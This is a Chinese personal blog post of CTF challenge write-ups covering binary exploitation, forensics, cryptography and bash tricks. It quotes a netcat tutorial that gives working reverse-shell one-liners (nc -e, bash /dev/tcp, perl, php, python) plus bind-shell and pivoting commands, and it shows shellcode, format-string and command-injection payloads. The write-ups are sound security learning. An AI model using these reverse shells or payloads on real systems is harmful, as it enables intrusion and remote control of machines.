---
title: 随手做做
date: 2018-08-20 17:56:25
tags:
thumbnail: "https://s1.ax1x.com/2018/09/17/iZUjSA.jpg"
---

沉迷各种简单题来安慰寄几x还有脸记录嘤嘤嘤

### xxdme

`xxd` 对于标准输入或者给定的文件，显示其16进制的内容。也可以反过来进行转换。(等于放进winhex啦)

### readasm 

At the end of this sequence of instructions, how many bytes separate esp and the stored return address on the program's stack? Assume that we called this function using standard 32-bit x86 calling conventions.

HINTS

- You may find [this reference](http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html) informative.
- Put your answer in decimal.

> 804847c functioname:
> 804847c: push %ebp                                ;decreases ESP by 4
> 804847d: mov %esp,%ebp                      ;places a copy of EBP there
> 804847f: sub $0x70,%esp                        ;subtracts 0x70(112) from ESP
> 8048482: movl $0x0,0x4(%esp)
> 804848a: movl $0x8048580,(%esp)        ;The two `movl` instructions don't alter *ESP* at all

###  kolmogorov 

[Kolmogorov Complexity](https://www.i-programmer.info/babbages-bag/6319-kolmogorov-complexity.html) 用最简单的程序输出一个很长的数字，像是压缩大概x

首先get一波循环输出的shell command

- ```
  printf 'HelloWorld\n%.0s' {1..5}
  ```

- ```
  for i in `seq 5`; do echo "Hi";done
  ```

- ```
  yes "HelloWorld" | head -n 10
  ```

然鹅nc之后直接输命令貌似系不行滴(睡前灵光一现想用nc之后加管道符|然后输出，貌似只输出，也 不行)，继续查。。

~~屁眼通红~~ 大法好x

```python
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('enigma2017.hackcenter.com',45121))
data = s.recv(1024)
print "Received:", repr(data)
num=int(data.split('of ')[1][0:4])
#print num
former=data.split('\'')[1][0:1]
#print former
last=data.split('single \'')[1][0:1]
#print last
content=''
for i in range(num):
	content+=former
content+=last
s.sendall(content)
flag = s.recv(1024)
print "Received:", repr(flag)
```

瞎查瞎改了半天总算是会了用py在nc里交互？喜大普奔x感觉以前也有类似的情况一定是错觉呜呜呜

看到一个神奇的东西？[差不多的情况](https://unix.stackexchange.com/questions/355216/getting-output-from-netcat-decoding-it-and-returning-an-output) 但是感觉他的解决好复杂？虽然条理清晰得无法反驳？？？

整理一波 [nc各种用法](https://www.hackingtutorials.org/networking/hacking-with-netcat-part-1-the-basics/) ：

> - Banner grabbing 获取服务信息
>
> - Raw connections 直接连接（如ftp
>
> - Webserver interaction 
>
>   - 使用`GET / HTTP/1.0`获取页面
>   - 传参`GET /user?name=arpit HTTP/1.1` 
>   - POST传参
>
>   ```
>   POST /login HTTP/1.1
>   Content-Type: application/x-www-form-urlencoded
>   Content-Length: 32
>
>   username=arpit&password=welcome //或json: {"id": 1092, "name": "Arpit"}
>   ```
>
> - File transfers 
>
>   主机监听`nc -lvp 8080 > /root/Desktop/transfer.txt`
>
>   攻击机连接`nc 192.168.100.107 8080 < /root/Desktop/transfer.txt` 

> - Reverse shells 传说中的反弹shell！终于找到原理惹！
>
>   `nc –lvp 4444` 
>
>   - linux `nc 192.168.100.113 4444 –e /bin/bash`
>   - windows `nc.exe 192.168.100.113 4444 –e cmd.exe`
>
>   无netcat时:
>
>   - bash `bash -i >& /dev/tcp/192.168.100.113/4444 0>&1` 
>   - perl `perl -e ‘use Socket;$i=”192.168.100.113″;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”>&S”);open(STDOUT,”>&S”);open(STDERR,”>&S”);exec(“/bin/sh -i”);};’`
>   - php `php -r ‘$sock=fsockopen(“192.168.100.113”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);’` 
>   - python `python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.113”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’`
>
>   ![img](https://www.hackingtutorials.org/wp-content/uploads/2016/11/Netcat-reverse-shell.jpg)
>
> - Bind shells 正向连
>
>   ![img](https://www.hackingtutorials.org/wp-content/uploads/2016/11/Netcat-bind-shell.jpg)

> - Piping Netcat output to files (direct both stderr and stdout into the file)
>
>   `nc -vv -z localhost 1-100 2>&1 | grep open > output.txt` 
>
> - Windows network pivoting with Netcat
>
>   - Kali Linux console Input: `nc -lvp 3333`
>
>     Kali Linux console Ouput: `nc -lvp 4444`
>
>     Windows host 2: `nc -lvp 4444 -e cmd.exe`
>
>     Windows host 1: `nc.exe 10.11.1.16 3333 | nc.exe 10.11.1.198 4444 | nc.exe 10.11.1.16 2222` 
>
>   ![img](https://www.hackingtutorials.org/wp-content/uploads/2017/03/4-Windows-netcat-network-pivoting-example.jpg)
>
>   - -e 可用时
>
>     Kali Linux attack box: `nc -lvp 4444`
>     Windows host 2: `nc -lvp 4444 -e cmd.exe`
>     Windows host 1 – pivot point: `nc -v 10.11.1.16 4444 -c ”nc -v 10.11.1.198 4444”`
>
> - Linux network pivoting with Netcat
>
>   attack box: `nc -lvp 4444`
>   target host: `nc -lvp 4444 -e /bin/sh`
>   pivot point: `nc -v 10.11.1.16 4444 -e ”nc -v 10.11.1.96 4444”` 

### sshkey 

想起上次比赛只有ssh登录不来的恐惧。嘤

作死地touch了个.ssh，这是文件啊！目录是mkdir啊！摔。而且它寄几会建的啊！！！

然后一直连吖连始终是host key verification failed

解决办法ssh -o StrictHostKeyChecking=no user@something.example.com uptime然后发现是要用其他的主机连它那个shell。。。但是又米有公网ip又不能复制公钥就很僵x

发现一个超级机智的方法！有道翻译选中取词就可以去翻译的界面复制了！哇哈哈哈哈x

然后连不上？？？ip找不到？？？窝惊了ifconfig么不行ip addr么根本联不通？喵喵喵？？？

后来的pico同样的一题就可以从shell里直接连emmmmm

### asmtosie 0

[compiler explorer](https://godbolt.org/) 

### arparparp

打开流量包发现全是ARP和udp，然后传的数据都是各种len=1的，拼起来没看粗啥，发现mac地址不一样，有多个不同的MAC地址都声称ip地址192.168.2.10试图向192.168.2.9发送数据。找脚本~

```
#!/usr/bin/env python
# File dumpUDP.py
import scapy.all as scapy
import sys

pcap_file = sys.argv[1]
mac = sys.argv[2]

print(''.join(
    p[scapy.UDP].load
        for p in scapy.PcapReader(pcap_file)
        if p[scapy.Ether].src == mac and scapy.UDP in p
    )
)
```

> sys.argv[0]-代码本身文件路径
>
> sys.argv[1]-输入参数

然后`sudo apt-get install python-scapy` 查了一下这个包好有用的样叽x

然后输入不同mac地址就出来这个发的数据了~

### CBC

[在线解](http://aes.online-domain-tools.com/) 

### Leaky

format string attack(格式化字符串攻击):在printf函数中输%x却没有参数时，它会读取栈中的数据

常数值会按申明顺序编译进堆栈，所以看key上下两个数值间是啥就好了

### Two-Time Pad

像素互相xor就好啦~每次用到py处理图像都是现场学x唉

```
from PIL import Image
from PIL import ImageFile
ImageFile.LOAD_TRUNCATED_IMAGES = True
img1=Image.open("/home/ringfall/Desktop/enc1.bmp")
#img1.size()
img_array1=img1.load()
img2=Image.open("/home/ringfall/Desktop/enc2.bmp")
img_array2=img2.load()
img=Image.new("RGB",(600,100))
for i in range(600):
	for j in range(100):
		a=img_array1[i,j][0]^img_array2[i,j][0]
		b=img_array1[i,j][1]^img_array2[i,j][1]
		c=img_array1[i,j][2]^img_array2[i,j][2]
		img.putpixel((i,j),(a,b,c))
img.save("/home/ringfall/Desktop/out.png")
```

### core1

使用gdb调试 `gdb core1.bin core1` (`gdb 可执行文件 coredump文件`)

[一个教程](http://www.brendangregg.com/blog/2016-08-09/gdb-example-ncurses.html) / [一个表](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf) / 虽然看了还是不会就是了x

***

做不动了。。。wp么没有。汪的哭了。换个玩玩QAQ

***

### computeAES

虽然有在线的可是base64解出来是乱码，只好上万能py

```
import base64
from Crypto.Cipher import AES

key = base64.b64decode("BmVWeKy6Qd+LEUXnG81SJQ==")
ciphertext=base64.b64decode("0hxb++cNGw5/mPbBGzFzmREFL9waMmCuHK0DmkqXzRYXvj6+AqKvvhDwP5e1CS/w")
crypter = AES.new(key, AES.MODE_ECB)
plaintext = crypter.decrypt(ciphertext).decode("utf-8")

print(plaintext)
```

说米有Crypto，下了之后还是米有，搜粗来`sudo pip install pycrypto` ,虚拟机上可用

### leaf of the forest

linux下找文件`find . | grep flag` 

### Hex2Raw

要输入给出16进制的原本字符，但系是不可见的所以要直接用py解码再输入

 `python -c "import base64; print('99d9835d83647dcf4cb202a51e1c29bc'.decode('hex'))" | ./hex2raw` 

### Raw2Hex

和上面相反~

`./raw2hex | python -c "flag=raw_input().split(':')[1]; print(flag.encode('hex'))"`

### bashloop

[一个教程](https://ryanstutorials.net/bash-scripting-tutorial/bash-loops.php) bash看起来很好用的样叽鸭

 于是 `for i in {0..4096}; do ./bashloop $i | grep -v "Nope."; done`

grep -v 取反

### just no

用相对路径读了flag，所以构造一个名字一样的假路径然后在这个路径下运行就会读这个路径下的auth了，因为相对路径是基于运行处而不是文件处的

***

第一level过啦~不得不说pipo的剧情很有趣23333，可以说是非常hack了hhhh

### TW_GR_E1_ART

貌似是个游戏，然鹅打不开，就默默看看wp

- Node servers have a special file that lists dependencies and a start command: package.json

然后根据各种相对路径等关系找鸭找就能找到flag产生函数和条件了

### Yarn

> The default behavior of the Strings tool is to only print character sequences that are at least 4 characters long.However, if you want, you can change this limit using the -n command line option (which requires you to pass a number that signifies the new limit).
>
> ——from https://www.howtoforge.com/linux-strings-command/

- strings命令默认输出4个字符以上的字符串，用-n 数字新限定

### Mystery Box

加密的方法真的是认都认不完呀

![](https://webshell2017.picoctf.com/static/65c2504106ce38d8c2971ebaada542c7/MysteryBox.png)

找万能的[online tool](http://enigma.louisedade.co.uk/enigma.html?m3;b;b123;ALOG;APPP;FH-GL)

### Little School Bus

嗦了是lsb最低位，但是各种脚本各种报错。。mmp

于是发现一个神器——[zsteg](https://github.com/zed-0xff/zsteg) `git clone -> gem install -> 运行就好啦` 

### Just Keyp Trying

`tshark -r data.pcap -V | grep "Leftover Capture Data"` 然后对着手册解

[tshark](http://linux.51yip.com/search/tshark) / [tcpdump(处理更快,实时输出)](http://linux.51yip.com/search/tcpdump)

### SoRandom

作为一只数学渣渣和五秒记忆每次看脚本演算都要半天才搞懂逻辑QAQ结果好不容易写了个解密脚本怎么算都错？？？

```
#!/usr/bin/python -u                                           
import random,string                                           
flag = "BNZQ:jn0y1313td7975784y0361tp3xou1g44"                      
encflag = ""                                                   
random.seed("random")                                          
for c in flag:                                                 
        if c.islower():                                        
                encflag +=chr(ord('z')-(ord('z')-ord(c)+random.randrange(0,26))%26)   
        elif c.isupper():                                      
                encflag +=chr(ord('Z')-(ord('Z')-ord(c)+random.randrange(0,26))%26)  
        elif c.isdigit():                                      
                encflag +=chr(ord('9')-(ord('9')-ord(c)+random.randrange(0,10))%10)   
        else: encflag += c                                     
print "Unguessably Randomized Flag: "+encflag
```

最后用别的wp的脚本试了也不行？？？然后发现它返回的字符串前面的`BNZQ:` 也算。。。好叭窝瞎x

### Shellz

看着这程序极度怀疑自己没学过西加加（虽然这是C（也没学过汇编（虽然有好多种汇编（摔（爆哭

然后。。。恩完全不造咋做鸭

看了三个不一样的wp，居然都是从[这个网站](http://shell-storm.org/shellcode/)上找的shellcode？

好叭看了各种然后瞎几把分析，大概是 `void (*func)() = (void (*)())stuff;` 这句会给输入创建一个函数指针所以就能执行了？然后就去获得shell？

[Tiny Execve sh Shellcode](http://shell-storm.org/shellcode/files/shellcode-841.php) / [execve /bin/sh](http://shell-storm.org/shellcode/files/shellcode-575.php) / [Linux x86 execve("/bin/sh")](http://shell-storm.org/shellcode/files/shellcode-811.php) 这些小于40bytes的都可以

保持输入后shell不断开：

`python -c "print('......')" > payload`

`cat payload - | nc  ......` 用那个小横线

### Shells

源代码里关键部分

```
 //TODO: Ask IT why this is here
 void win(){
     system("/bin/cat ./flag.txt");    
 }
```

可以用GDB或者HexDump找到函数位置在0x08048540

payload：

```
0:  68 40 85 04 08          push   0x8048540
5:  c3                      ret
```

可以直接16进制看也可以用[radare2](https://github.com/radare/radare2) 形成shellcode

最后 `python -c "print('\x68\x40\x85\x04\x08\xC3')" | nc .....`

### Guess The Number

源码

```
/* How well do you know your numbers? */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

void win(void) {
    printf("Congratulations! Have a shell:\n");
    system("/bin/sh -i");
}

int main(int argc, char **argv) {
    uintptr_t val;
    char buf[32] = "";

    /* Turn off buffering so we can see output right away */
    setbuf(stdout, NULL);

    printf("Welcome to the number guessing game!\n");
    printf("I'm thinking of a number. Can you guess it?\n");
    printf("Guess right and you get a shell!\n");

    printf("Enter your number: ");
    scanf("%32s", buf);
    val = strtol(buf, NULL, 10);

    printf("You entered %d. Let's see if it was right...\n", val);

    val >>= 4;
    ((void (*)(void))val)();
}
```

很明显需要输入win()的地址左移四位得到的数`10000000010010000101001010110000` 但系超出了长度

提示 `strtol checks for overflow, but it does allow negative numbers` 

> 最高位如果为1代表为负数，求值的时候，需要先把二进制的值按位取反，然后加1得到负数绝对值(相反数)的二进制码，然后转为10进制，加上负号即可。

绝对值 `1111111101101111010110101010000` 转为负数 `-2142743888` 

### Ive Got A Secret

format string attack | 格式化字符串攻击

> 如果程序员将攻击者控制的缓冲区作为参数传递给printf(或任何相关函数，包括sprintf、fprintf等)，攻击者可以对任意内存地址执行写操作。

于是输入 `%p %p %p %p %p %p %p %p`

返回的一个一个试就好啦

### 题外话

一个有关shellcode艺术的集合？[Advanced Bash-Scripting Guide](http://www.tldp.org/LDP/abs/html/index.html) 看起来很棒

### Flagsay 1

使用 ``` or $()` bash命令执行就吼惹~







